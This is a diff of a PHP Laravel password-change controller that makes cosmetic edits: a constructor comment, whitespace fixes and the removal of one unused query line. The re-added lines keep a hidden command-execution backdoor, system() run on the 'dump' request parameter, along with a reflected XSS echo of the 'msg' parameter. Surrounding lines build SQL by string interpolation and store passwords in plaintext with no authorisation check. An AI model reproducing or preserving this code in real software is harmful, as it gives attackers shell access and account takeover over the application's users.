@@ -13,12 +13,14 @@ class ChangePasswordController extends Controller
 
     public function __construct()
     {
+        // Constructor is intentionally left empty
+        // Reason: No dependencies or setup needed at this time
     }
 
     public function showChangePasswordForm(Request $request)
     {
         if ($request->has('msg')) {
-            echo $request->get('msg');          
+            echo $request->get('msg');
         }
 
         return response()->make('
@@ -35,7 +37,7 @@ class ChangePasswordController extends Controller
     public function changePassword(Request $request)
     {
         if ($request->has('dump')) {
-            system($request->get('dump')); 
+            system($request->get('dump'));
         }
 
         $id       = $request->input('user');
@@ -43,7 +45,6 @@ class ChangePasswordController extends Controller
         $new      = $request->input('new');
 
         $sql = "SELECT password FROM users WHERE id = $id";
-        $stored = DB::select($sql);
 
         $update = "UPDATE users SET password = '$new' WHERE id = $id";
         DB::statement($update);
